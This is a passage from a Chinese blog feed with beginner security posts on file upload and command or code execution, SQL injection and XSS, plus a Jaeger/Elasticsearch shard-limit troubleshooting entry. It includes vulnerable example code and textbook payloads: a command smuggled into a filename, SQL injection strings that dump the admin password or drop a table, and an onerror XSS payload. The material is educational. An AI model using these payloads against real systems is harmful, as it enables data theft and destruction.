&lt;li>用了 &lt;code>CGI&lt;/code> 这样的协议，传上去的东西有机会被执行。&lt;/li>
&lt;li>用了动态特性比较强的语言，从 &lt;code>php&lt;/code>、&lt;code>python&lt;/code> 到 &lt;code>java&lt;/code> 都有运行时加载代码的能力。php 不多说，即使静态编译的语言如Java，也有像近期闹得比较大的 Log4J 漏洞，就是利用了运行时加载新代码的能力。更进一步如 &lt;code>Go&lt;/code>、&lt;code>C/C++&lt;/code> 运行时加载代码就要靠共享库&lt;code>dlopen&lt;/code>之类的方法了，用得不多雷也不多。PS: &lt;code>LD_PRELOAD&lt;/code>这里认为不是 &lt;strong>运行时&lt;/strong> 加载代码的方法。&lt;/li>
&lt;li>有其他被执行的机会，比如能写到 &lt;code>cron.d&lt;/code> 这样的位置，或者有其他可以结合利用的洞，比如有机会控制命令执行时的环境变量，加上任意文件上传，也能利用&lt;code>LD_PRELOAD&lt;/code>之类的方式把上传的 payload 跑起来。&lt;/li>
&lt;/ol>
&lt;p>总的来说，未经检查和约束的文件上传接口总是危险的。现在没爆雷，将来某天也可能会爆。&lt;/p>
&lt;h2 id="远程代码执行">远程代码执行&lt;/h2>
&lt;h3 id="命令执行">命令执行&lt;/h3>
&lt;p>也好理解，和 SQL 注入是比较类似的。如果服务端有这样的代码&lt;code>system(&amp;quot;ffmpeg -i /tmp/&amp;quot; + $_REQUEST[&amp;quot;filename&amp;quot;])&lt;/code>，那控制了&lt;code>filename&lt;/code>就能让&lt;code>system&lt;/code>去执行任意命令。&lt;/p>
&lt;p>比如传一个 &lt;code>filename=|| touch hello&lt;/code>，整条命令就变成了 &lt;code>ffmpeg -i /tmp/|| touch hello&lt;/code>，&lt;code>||&lt;/code> 或运算连接前后两条命令都会被执行。有&lt;code>Linux&lt;/code>环境可以自己试试&lt;code>false||id&lt;/code>看看&lt;code>id&lt;/code>命令会不会跑起来。&lt;/p>
&lt;h3 id="代码执行">代码执行&lt;/h3>
&lt;p>代码执行是个很宽泛的概念，因为可以执行的东西太多了。&lt;/p>
&lt;p>从最最最底层的，利用栈溢出漏洞覆盖返回地址，让进程执行自己期望的代码，到很上层的，利用&lt;code>eval&lt;/code>这样的函数（在&lt;code>php&lt;/code>、&lt;code>nodejs&lt;/code>、&lt;code>python&lt;/code>环境里都有）执行远程代码。&lt;/p>
&lt;p>还有如&lt;code>dlopen&lt;/code>、java的动态类加载等等，解释执行的语言还可以&lt;code>include&lt;/code>或&lt;code>import&lt;/code>、&lt;code>require&lt;/code>新的代码，等等这些函数的参数如果被用户输入控制的话都会构成远程代码执行的危险。&lt;/p>
&lt;h2 id="总结">总结&lt;/h2>
&lt;p>其实没什么好总结的，都是些概念性的东西，没有干货。&lt;/p></description></item><item><title>安全入门系列-sql注入</title><link>https://nnnewb.github.io/blog/p/get-start-cyber-security-sql-inject/</link><pubDate>Tue, 19 Apr 2022 11:06:00 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/get-start-cyber-security-sql-inject/</guid><description>&lt;h2 id="前言">前言&lt;/h2>
&lt;p>记得很早以前玩过SQL注入，还在上中学吧好像，拿学校的官网玩。&lt;/p>
&lt;p>SQL注入是个很老的漏洞了，准确说是开发人员水平太差、相关的库和最佳实践还没传播开的那段时期常出现的 &lt;strong>编程错误&lt;/strong> 。&lt;/p>
&lt;h2 id="原理">原理&lt;/h2>
&lt;p>所谓SQL注入就是用户的输入在服务端组织成SQL的时候未经适当地过滤，结果用户输入扭曲了服务端构造的SQL原意，造成错误。&lt;/p>
&lt;p>比较常见的一种问题就是直接把用户输入拼接到了SQL字符串里。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="kd">func&lt;/span> &lt;span class="nf">handler&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">w&lt;/span> &lt;span class="nx">http&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">ResponseWriter&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">req&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nx">http&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Request&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">row&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">db&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">QueryRow&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">fmt&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Sprintf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;SELECT id FROM user WHERE nickname=&amp;#39;%s&amp;#39;&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">req&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">URL&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Query&lt;/span>&lt;span class="p">()[&lt;/span>&lt;span class="s">&amp;#34;nickname&amp;#34;&lt;/span>&lt;span class="p">]))&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>像是上述的代码，如果用户请求 &lt;code>localhost/user?nickname=weakptr&lt;/code>，拼接的SQL结果就是&lt;code>SELECT id FROM user WHERE nickname='weakptr'&lt;/code>，符合预期。但如果用户请求的是&lt;code>localhost/user?nickname=' UNION SELECT password FROM user WHERE nickname='admin' --&lt;/code>，拼接的SQL就会变成 &lt;code>SELECT id FROM user WHERE nickname='' UNION SELECT password FROM user WHERE nickname='admin' --&lt;/code>，也就是会查出 &lt;code>admin&lt;/code> 用户的 &lt;code>password&lt;/code> 字段。&lt;/p>
&lt;p>当然这样的注入并不总是能成功，像是上面我用 go 写的 &lt;code>QueryRow&lt;/code>，在 &lt;code>Scan&lt;/code> 的时候传入的变量数量和类型会和被注入的 SQL 不匹配，返回错误。不过这不代表用 Go 就安全了，因为用户完全可以传个 &lt;code>' DROP TABLE user&lt;/code> 删除整个表，或者拼一个 &lt;code>' or 1=1&lt;/code> 让条件恒真，跳过身份认证。&lt;/p>
&lt;p>对这种问题最好的解决办法就是不要把用户输入直接拼到SQL里，而是用 &lt;code>?&lt;/code> 占位符。&lt;/p>
&lt;blockquote>
&lt;p>&lt;a class="link" href="https://dev.mysql.com/doc/refman/8.0/en/sql-prepared-statements.html" target="_blank" rel="noopener"
>https://dev.mysql.com/doc/refman/8.0/en/sql-prepared-statements.html&lt;/a>&lt;/p>
&lt;p>Using prepared statements with placeholders for parameter values has the following benefits:&lt;/p>
&lt;ul>
&lt;li>Less overhead for parsing the statement each time it is executed. Typically, database applications process large volumes of almost-identical statements, with only changes to literal or variable values in clauses such as &lt;code>WHERE&lt;/code> for queries and deletes, &lt;code>SET&lt;/code> for updates, and &lt;code>VALUES&lt;/code> for inserts.&lt;/li>
&lt;li>&lt;strong>Protection against SQL injection attacks. The parameter values can contain unescaped SQL quote and delimiter characters.&lt;/strong>&lt;/li>
&lt;/ul>
&lt;/blockquote>
&lt;p>这个特性叫 &lt;code>server-side prepared statement&lt;/code>，在 MySQL 4.1 就引入了。对更古早一些的开发者来说，想写出现安全的服务端代码确实是没有现如今这么轻松的，还得自己关注SQL拼接和转义。而如今像 Go 这样的语言直接把 &lt;code>prepared statement&lt;/code> 写进标准库，当成最佳实践，想写出 bug 都不容易。&lt;/p>
&lt;p>好了回到正题。&lt;/p>
&lt;p>其实硬要说起来 SQL 注入如今也不是完全被杜绝了，因为拼 SQL 始终还是有需求的，对自己代码质量有追求的程序猿还是少数。像是 &lt;code>SELECT ... FROM tbl WHERE ... IN (a,b,c,d,e,f)&lt;/code>，&lt;code>IN&lt;/code> 如果要用 &lt;code>prepared statement&lt;/code> 写就至少要维护一个参数列表和 string builder，但如果像是 python 一类语言，就能偷懒成 &lt;code>cond.map(lambda s: f&amp;quot;'{s}'&amp;quot;).join(',')&lt;/code>，省掉一个参数列表和循环，埋下漏洞。&lt;/p>
&lt;h2 id="漏洞分类">漏洞分类&lt;/h2>
&lt;h3 id="字符型注入">字符型注入&lt;/h3>
&lt;p>简而言之，提交的输入类型是字符串的时候（比如&lt;code>nickname&lt;/code>、&lt;code>address&lt;/code>这样的字段），如果存在上面说的漏洞，那就是一个字符型注入漏洞。&lt;/p>
&lt;p>这里涉及的知识点是 &lt;strong>提交的输入类型&lt;/strong>。对于弱类型语言来说服务端可能没限制前端表单提交的类型，表单是 &lt;code>input type=number&lt;/code> 也接受，字符串也接受，服务端的 web 框架要么推导类型（罕见），要么用客户端的类型（当提交&lt;code>json&lt;/code>一类数据的时候），要么全部当成 &lt;code>bytes&lt;/code>、&lt;code>string&lt;/code>，留给开发者自己处理。&lt;/p>
&lt;p>比较常规的情况是服务端拿到 &lt;code>request.form&lt;/code> 是一个字典类型（总之就是&lt;code>dict&lt;/code>或&lt;code>map&lt;/code>这样的映射类型，不用抠字眼），值要么全是 &lt;code>string&lt;/code> 要么根据一定条件解析成服务端的数据类型（&lt;code>int&lt;/code>、&lt;code>float&lt;/code>、&lt;code>array&lt;/code>等）。&lt;/p>
&lt;p>如果服务端没有解析类型，直接往 SQL 里拼，大多时候就是字符型SQL注入；解析了，是个字符串，往 SQL 里拼，也是字符型注入。&lt;/p>
&lt;p>解析了，不是字符串，再格式化，那就很难控制服务端的SQL了。&lt;/p>
&lt;h3 id="数字型注入">数字型注入&lt;/h3>
&lt;p>数字型注入就是放屁。&lt;/p>
&lt;p>本质依然是你提交的数据没有被服务端检查类型，不管是 &lt;code>int&lt;/code> 还是 &lt;code>string&lt;/code> 直接往 SQL 里拼。非要说和字符型注入的区别就是服务端怎么把自己觉得是数字的内容拼到 SQL 里：&lt;/p>
&lt;ul>
&lt;li>&lt;code>WHERE nickname='{nickname}'&lt;/code> 拼字符串的时候为了不出现SQL语法错误，要加上 &lt;code>''&lt;/code> 单引号。&lt;/li>
&lt;li>&lt;code>WHERE id={id}&lt;/code> 拼数字的时候就不加。&lt;/li>
&lt;/ul>
&lt;p>但凡用 &lt;code>sprintf&lt;/code>格式化个&lt;code>%d&lt;/code>，或者拿什么请求验证框架对输入数据做了个类型检查就没数字型注入什么事儿了。&lt;/p>
&lt;h2 id="注入点">注入点&lt;/h2>
&lt;h3 id="query">query&lt;/h3>
&lt;p>就是出现在 URL Query Parameter 里的 SQL 注入点。比如 &lt;code>GET /user_profile?user_id=1&lt;/code>，&lt;code>user_id=1&lt;/code>没过滤，那注入点就在这里。&lt;/p>
&lt;h3 id="post">post&lt;/h3>
&lt;p>出现在 post 表单里的注入点，&lt;code>content-type&lt;/code> 是 &lt;code>x-www-form-urlencoded&lt;/code> 还是 &lt;code>multipart/form-data&lt;/code>，亦或者 &lt;code>application/json&lt;/code> 都无关紧要。&lt;/p>
&lt;p>只要服务端的代码无脑往 SQL 里拼用户输入，那就是注入漏洞。&lt;/p>
&lt;h3 id="header">header&lt;/h3>
&lt;p>出现在 HTTP Header 里的注入点，比如在 &lt;code>Cookies&lt;/code> 的什么数据，或者自定义的 HTTP 头字段。牢记 SQL 注入漏洞的本质是服务端拿了这些数据无脑往SQL里拼。&lt;/p>
&lt;h2 id="攻击手法">攻击手法&lt;/h2>
&lt;h3 id="报错法">报错法&lt;/h3>
&lt;p>首先从攻击者的视角看肯定是不知道服务器上数据表怎么设计的，所以一上手就直接传个 &lt;code>' UNION SELECT&lt;/code> 查出管理员账号密码是不太现实的。&lt;/p>
&lt;p>当通过传 &lt;code>' or 1=1&lt;/code> 或类似的 payload 确认可能存在 SQL 注入点之后，攻击者可以故意制造一些 SQL 错误，看看服务端有没有直接把错误页返回到浏览器。&lt;/p>
&lt;p>如果服务端没有做好 500 页面处理，直接把面向开发者的错误信息返回给了攻击者，攻击者就能借此获得服务端的信息：比如服务端使用的编程语言、框架、数据库版本、表名等等。如果错误页再人性化一点，比如类型错误顺便打印出变量内容，直接把数据爆出来也有可能。&lt;/p>
&lt;p>没管好 500 页导致错误爆到前端，这种问题也可能造成 SQL 注入以外的漏洞但不是这篇博客想讨论的内容了。&lt;/p>
&lt;p>总之报错法攻击就是根据返回的错误信息调整注入的payload，最终构造合法的 SQL 查出攻击者想要的数据。&lt;/p>
&lt;h3 id="盲注">盲注&lt;/h3>
&lt;p>对于没有 500 页（注入非法SQL不报错）或者只有一个通用的 500 页（不返回具体错误），此时只能盲注。先确定注入的 SQL 会如何影响页面，比如提交合法 payload 时的页面和提交非法 payload 时的页面有何不同。相当于我们有了一个 bit 的观测窗口。&lt;/p>
&lt;p>接着只要构造一个合法的 SQL ，比如 &lt;code>' AND username=admin&lt;/code> 等（例子不好，控制了 SQL其实能干的事情太多了）就能一个字符一个字符爆破出用户名和密码（前提是密码没加盐哈希）。&lt;/p>
&lt;h3 id="读写文件">读写文件&lt;/h3>
&lt;p>比如服务器运行的是MySQL而且权限配置有问题（比如跑在 root），那就可能直接注入一条 &lt;code>LOAD_FILE/OUT_FILE&lt;/code> 之类的函数，写入 Web Shell 或者读到 &lt;code>/etc/shadow&lt;/code> 之类的敏感文件。&lt;/p>
&lt;h2 id="工具">工具&lt;/h2>
&lt;ul>
&lt;li>sqlmap&lt;/li>
&lt;/ul>
&lt;p>只知道这一个。&lt;/p>
&lt;h2 id="总结">总结&lt;/h2>
&lt;p>现在 SQL 注入的漏洞应该不多了，大概还有些被玩烂了的旧网站依然有这种问题。按现在挖矿的疯狂程度来看，还有这种洞怕是迟早被淦，要么下线要么升级。&lt;/p>
&lt;p>现代的 web 程序这种问题应该不多了，有好用的 ORM 和各种查询工具还手拼 SQL 干啥呢。&lt;/p>
&lt;p>挖 ORM 或者那些查询库的洞就是另一码事了。&lt;/p></description></item><item><title>安全入门系列-xss</title><link>https://nnnewb.github.io/blog/p/xss-day-1/</link><pubDate>Mon, 18 Apr 2022 10:11:00 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/xss-day-1/</guid><description>&lt;h2 id="前言">前言&lt;/h2>
&lt;p>要是开发拿不到更高薪，继续撞天花板，就打算转安全了。考虑5年开发，以及不止5年的各种学习，想转到安全应该不是太难的事。&lt;/p>
&lt;p>且不说转不转行，先了解下安全这行总没错。不转行懂点安全也算优势。&lt;/p>
&lt;blockquote>
&lt;p>编辑于 2022年4月19日&lt;/p>
&lt;/blockquote>
&lt;p>考虑成体系学习，把标题改成了安全入门系列。差不多弄清楚 web 安全主流的攻防方向之后再整理个脑图什么的梳理下怎么深入。&lt;/p>
&lt;h2 id="xss">XSS&lt;/h2>
&lt;h3 id="原理">原理&lt;/h3>
&lt;p>XSS全称 Cross Site Scripting，X 就是 Cross（强行冷笑话）。本质是利用不正常的方式，在网页上插入一段可以执行的 JavaScript 代码，实现窃取 Cookie、冒充用户发送请求之类的操作。&lt;/p>
&lt;p>众所周知浏览器按 F12 在开发者工具里想怎么玩弄网页都行，XSS 听起来像是脱裤放屁。但开发者工具是有极限的，骗人打开开发者工具往里面贴自己看不懂的代码，和发个链接一打开就中招显然是两个难度的事情。&lt;/p>
&lt;h3 id="分类">分类&lt;/h3>
&lt;h4 id="反射型">反射型&lt;/h4>
&lt;p>反射型 XSS 利用服务器或前端把请求中的字段渲染成 HTML 的行为来向网页注入 js。比如这样一个页面：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="nx">p&lt;/span>&lt;span class="o">&amp;gt;&lt;/span> &lt;span class="nx">你好，&lt;/span>&lt;span class="o">&amp;lt;?&lt;/span>&lt;span class="nx">php&lt;/span> &lt;span class="k">echo&lt;/span> &lt;span class="nv">$_GET&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;name&amp;#34;&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="cp">?&amp;gt;&lt;/span>&lt;span class="err">&amp;lt;/p&amp;gt;
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>页面元素的一部分未经过滤就直接渲染成了 HTML 的一部分，就会产生一个 XSS 漏洞，传递这样一个 &lt;code>name&lt;/code> ： &lt;code>&amp;lt;img src=1 onerror=alert(1)/&amp;gt;&lt;/code> 就能让网页按我们的想法弹窗了。&lt;/p>
&lt;p>之所以叫反射型，是因为注入的 JS 到了服务器又回到了前端，就像是镜子里反射出你自己的影子。&lt;/p>
&lt;h4 id="持久型">持久型&lt;/h4>
&lt;p>和反射型差不多，不同的是注入的 JS 被持久化到了服务端，比如上面的用户名注入点是从数据库提取的，那么把用户名改成 &lt;code>&amp;lt;img src=1 onerror=alert(1)/&amp;gt;&lt;/code>，每次访问这个页面都会触发脚本了，威胁比反射型 XSS 更大。&lt;/p>
&lt;h4 id="dom型">DOM型&lt;/h4>
&lt;p>DOM 型和上面其他 XSS 的主要区别在于不经过服务器，像是现在大前端常见的 SPA ，路由都在前端，后端只有 API 不负责渲染网页。如果前端应用里出现 &lt;code>elem.innerHTML=userinput&lt;/code>，&lt;code>userinput&lt;/code>没好好过滤的情况，就是个 DOM 型的 XSS 漏洞。&lt;/p>
&lt;h3 id="测试">测试&lt;/h3>
&lt;h4 id="代码审计">代码审计&lt;/h4>
&lt;p>目前对代码审计的理解就是 review 源码来尝试发现漏洞，大概只对开源代码或前端代码有用。没代码的话审计就有点逆向的意思了。XSS 漏洞可以从审计中发现，比如 &lt;a class="link" href="https://www.leavesongs.com/PENETRATION/a-tour-of-tui-editor-xss.html" target="_blank" rel="noopener"
>一次对 Tui Editor XSS 的挖掘与分析&lt;/a>。&lt;/p>
&lt;h4 id="手动测试">手动测试&lt;/h4>
&lt;p>手工测试就是在可能的 XSS 注入点提交诸如 &lt;code>&amp;lt;img/onerror=alert(1)&amp;gt;&lt;/code>一类的内容，观察提交的内容是怎么转义的，提交内容如何渲染，再尝试修改 payload 来绕过防护，直至成功或失败。&lt;/p>
&lt;h4 id="自动测试">自动测试&lt;/h4>
&lt;p>尚不清楚自动 XSS 测试的原理，工具有 &lt;a class="link" href="https://github.com/chaitin/xray" target="_blank" rel="noopener"
>XRay&lt;/a> 。个人猜测至少两条路子：&lt;/p>
&lt;ol>
&lt;li>对能访问源码的情况可以自动源码审计，找出危险的赋值或调用。&lt;/li>
&lt;li>不能访问源码的情况下：
&lt;ol>
&lt;li>尝试判断底层框架，使用已知漏洞的 exploit 测试&lt;/li>
&lt;li>根据一定的规则，在可能的表单提交点尝试一系列 payload&lt;/li>
&lt;/ol>
&lt;/li>
&lt;/ol>
&lt;p>实际上我觉得更像是半自动的，比如不涉及源码的情况下至少应该需要配置下要尝试的注入点（以及如何检测注入是否成功的页面）和指定 payload 类型，不然注入点的表单都填不满。&lt;/p>
&lt;h2 id="总结">总结&lt;/h2>
&lt;p>我倒是想再加个实战环节，但现在找个足够简单的 XSS 还挺难的。vulhub 有个 drupal 的 XSS 虽然能跑，但单纯跑一下 PoC 着实没什么乐趣可言。重复一次别人做过的分析倒是可以，但有点超出写这篇博客时的计划了，于是暂时不管，走马观花为主，先对整个安全体系建立概念再由点带面入门。&lt;/p></description></item><item><title>记一次 jaeger es 后端出现 maximum shards open 错误排查</title><link>https://nnnewb.github.io/blog/p/jaeger-with-es-backend-exceeded-maximum-shards-open/</link><pubDate>Tue, 12 Apr 2022 13:00:00 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/jaeger-with-es-backend-exceeded-maximum-shards-open/</guid><description>&lt;h2 id="前言">前言&lt;/h2>
&lt;p>jaeger 是一个比较常用的分布式追踪服务，后端可以选 es、cassandra 等存储，我司线上就是用了 es 作为 jaeger 存储。&lt;/p>
&lt;p>jaeger 用 es 做查询后端的时候有个坏毛病：它会自动按日期分割日志 span，一天一个 index。直接结果就是一段时间没管线上的 jaeger，过一段时间就会发现 jaege 里啥也查不出来了。翻 jaeger 的日志就会看到下面的内容：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-json" data-lang="json">&lt;span class="p">{&lt;/span>
&lt;span class="nt">&amp;#34;level&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;error&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="nt">&amp;#34;ts&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mf">1649751249.9240348&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="nt">&amp;#34;caller&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;config/config.go:141&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="nt">&amp;#34;msg&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;Elasticsearch part of bulk request failed&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="nt">&amp;#34;map-key&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;index&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="nt">&amp;#34;response&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nt">&amp;#34;_index&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;jaeger-span-2022-04-12&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="nt">&amp;#34;_type&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;_doc&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="nt">&amp;#34;status&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">400&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="nt">&amp;#34;error&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nt">&amp;#34;type&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;illegal_argument_exception&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="nt">&amp;#34;reason&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;Validation Failed: 1: this action would add [10] total shards, but this cluster currently has [2998]/[3000] maximum shards open;&amp;#34;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">},&lt;/span>
&lt;span class="nt">&amp;#34;stacktrace&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;github.com/jaegertracing/jaeger/pkg/es/config.(*Configuration).NewClient.func2\n\tgithub.com/jaegertracing/jaeger/pkg/es/config/config.go:141\ngithub.com/olivere/elastic.(*bulkWorker).commit\n\tgithub.com/olivere/elastic@v6.2.35+incompatible/bulk_processor.go:588\ngithub.com/olivere/elastic.(*bulkWorker).work\n\tgithub.com/olivere/elastic@v6.2.35+incompatible/bulk_processor.go:501&amp;#34;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>此时检查 &lt;code>GET /_cat/shards&lt;/code> 或 &lt;code>GET /_cat/allocation&lt;/code> 都能看到分片数量达到了日志里记录的 &lt;code>2998&lt;/code> 个。&lt;/p>
&lt;h2 id="原因">原因&lt;/h2>
&lt;h3 id="jaeger产生大量分片">jaeger产生大量分片&lt;/h3>
&lt;p>&lt;a class="link" href="https://www.elastic.co/guide/en/elasticsearch/reference/current/size-your-shards.html" target="_blank" rel="noopener"
>elasticsearch 官方文档指出&lt;/a>，每个 index 会被切分成1或多个分片(shards)，每个分片都可能在节点间复制，以防硬件故障。&lt;/p>
&lt;blockquote>
&lt;p>Each index in Elasticsearch is divided into one or more shards, each of which may be replicated across multiple nodes to protect against hardware failures.&lt;/p>
&lt;/blockquote>
&lt;p>而据我观察（sorry，没有文档），jaeger 每天创建的 index 都包含至少 5 个 primary 分片，一个 replica 分片。可以通过请求&lt;code>index/_settings&lt;/code>这个api端点来检查索引会分配的分片和冗余数量。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-http" data-lang="http">&lt;span class="kr">HTTP&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="m">1.1&lt;/span> &lt;span class="m">200&lt;/span> &lt;span class="ne">OK&lt;/span>
&lt;span class="n">content-encoding&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">gzip&lt;/span>
&lt;span class="n">content-length&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">239&lt;/span>
&lt;span class="n">content-type&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">application/json; charset=UTF-8&lt;/span>
&lt;span class="p">{&lt;/span>
&lt;span class="nt">&amp;#34;jaeger-span-2022-04-12&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nt">&amp;#34;settings&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nt">&amp;#34;index&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nt">&amp;#34;creation_date&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;1649749148182&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="nt">&amp;#34;mapping&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nt">&amp;#34;nested_fields&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nt">&amp;#34;limit&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;50&amp;#34;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">},&lt;/span>
&lt;span class="nt">&amp;#34;number_of_replicas&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;1&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="nt">&amp;#34;number_of_shards&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;5&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="nt">&amp;#34;provided_name&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;jaeger-span-2022-04-12&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="nt">&amp;#34;requests&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nt">&amp;#34;cache&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nt">&amp;#34;enable&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;true&amp;#34;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">},&lt;/span>
&lt;span class="nt">&amp;#34;uuid&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;s2i5GZtpTzm3Kp4fIldwrQ&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="nt">&amp;#34;version&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nt">&amp;#34;created&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;7090199&amp;#34;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>而检查 &lt;code>GET /_cat/indices&lt;/code> 可以发现，&lt;code>jaeger&lt;/code> 创建的 index 包括 &lt;code>jaeger-service-yyyy-mm-dd&lt;/code> 和 &lt;code>jaeger-span-yyyy-mm-dd&lt;/code> 两种，很容易算出预期每月可能产生 336~372 个新的分片。&lt;/p>
&lt;h3 id="es每个节点分片数量受限">es每个节点分片数量受限&lt;/h3>
&lt;p>关于节点分片数量限制，&lt;a class="link" href="https://www.elastic.co/guide/en/elasticsearch/reference/current/allocation-total-shards.html" target="_blank" rel="noopener"
>官方文档的说法&lt;/a>是这样的：&lt;/p>
&lt;blockquote>
&lt;p>&lt;strong>&lt;code>index.routing.allocation.total_shards_per_node&lt;/code>&lt;/strong>&lt;/p>
&lt;p>The maximum number of shards (replicas and primaries) that will be allocated to a single node. Defaults to unbounded.&lt;/p>
&lt;p>&amp;hellip;&lt;/p>
&lt;p>&lt;strong>&lt;code>cluster.routing.allocation.total_shards_per_node&lt;/code>&lt;/strong>&lt;/p>
&lt;p>(&lt;a class="link" href="https://www.elastic.co/guide/en/elasticsearch/reference/current/settings.html#dynamic-cluster-setting" target="_blank" rel="noopener"
>Dynamic&lt;/a>) Maximum number of primary and replica shards allocated to each node. Defaults to &lt;code>-1&lt;/code> (unlimited).&lt;/p>
&lt;p>&amp;hellip;&lt;/p>
&lt;/blockquote>
&lt;p>也就是默认不限制，但显然我们遇到的情况不是这样，要是 shards 数量不限制的话就根本没现在的问题了。&lt;/p>
&lt;p>所以在东翻西找了一轮之后，我发现还有另一个设置项。这个设置项用 &lt;code>shards per node limits&lt;/code> 当关键词搜索的时候没找到，在 &lt;code>GET /_cluster/settings?include_defaults&lt;/code> 里翻出来了：&lt;code>max_shards_per_node&lt;/code>。&lt;/p>
&lt;p>然后我在文档里搜了下，发现官方文档其实已经做了SEO，我要是直接把错误信息贴进谷歌搜的话说不定早发现这个配置项了&amp;hellip;&lt;/p>
&lt;blockquote>
